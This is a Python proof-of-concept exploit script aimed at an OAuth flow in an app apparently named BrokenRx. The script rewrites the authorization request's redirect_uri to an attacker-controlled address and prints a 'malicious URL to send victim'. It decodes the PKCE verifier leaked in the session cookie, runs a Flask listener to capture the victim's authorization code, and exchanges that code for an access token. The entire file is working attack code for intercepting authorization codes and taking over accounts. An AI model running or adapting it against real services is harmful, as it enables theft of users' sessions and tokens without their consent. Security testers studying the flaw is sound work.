#!/usr/bin/python3
'''
PoC which exploits the oauth misconfiguration
'''
from flask import Flask, request, redirect
import threading
import requests
import threading
import base64
import json
import os
from dotenv import load_dotenv

load_dotenv(".env.exploit")

app = Flask(__name__)

login_url = os.environ.get("LOGIN_URL")
TOKEN_URL = os.environ.get("TOKEN_URL")
dashboard_url = os.environ.get("DASHBOARD_URL")
CLIENT_ID = os.environ.get("CLIENT_ID")
REDIRECT_URI = os.environ.get("REDIRECT_URI")

print("[*] Starting BrokenRx OAuth Exploitation")
print("[*] PKCE Misuse > Code Interception > Session Fixation")
print()

def extract_request():

    login_request = requests.get(login_url, allow_redirects=0)

    query = login_request.headers["Location"]

    malicious_address = f"redirect_uri={REDIRECT_URI}"

    query_list = query.split("&")

    query_list[2] = malicious_address

    Redirected_link = "&".join(query_list)

    code_challenge = (query.split("&"))[3].split("=")[1]

    verifier = login_request.cookies.get("client_session").split(".")[0]

    while len(verifier) % 4:
        verifier = verifier + "="
    decoded = json.loads(base64.urlsafe_b64decode(verifier))

    pkce_verifier = decoded["pkce_verifier"]

    print(f"[+] PKCE Verifier     : {pkce_verifier}")
    print(f"[+] Code Challenge    : {code_challenge}")
    print()
    print("[+] Malicious URL to send victim:")
    print(Redirected_link)
    print()
    print("[*] Waiting for authorization code...")

    return(pkce_verifier)

callback_data = {}
callback_received = threading.Event()

@app.route("/callback", methods=["GET", "POST"])
def callback():
    global callback_data

    callback_data = {
        "args": dict(request.args)
    }

    callback_received.set()
    return redirect(dashboard_url)

def exchange_token(code, pkce_verifier):

    data = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "client_id": CLIENT_ID,
        "code_verifier": pkce_verifier,
    }
    r = requests.post(TOKEN_URL, data=data)

    return r.json()

def start_server():
    app.run(host="0.0.0.0", port=8888, debug=False, use_reloader=False)

def run_poc():
    pkce_verifier = extract_request()
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    print("Waiting for callback...")
    callback_received.wait()

    print("Callback received!")
    print("Args:", callback_data["args"])

    code = callback_data["args"].get("code")

    if not code:
        print("No code received")
        return

    token = exchange_token(code, pkce_verifier)
    print("Access token:", token)

run_poc()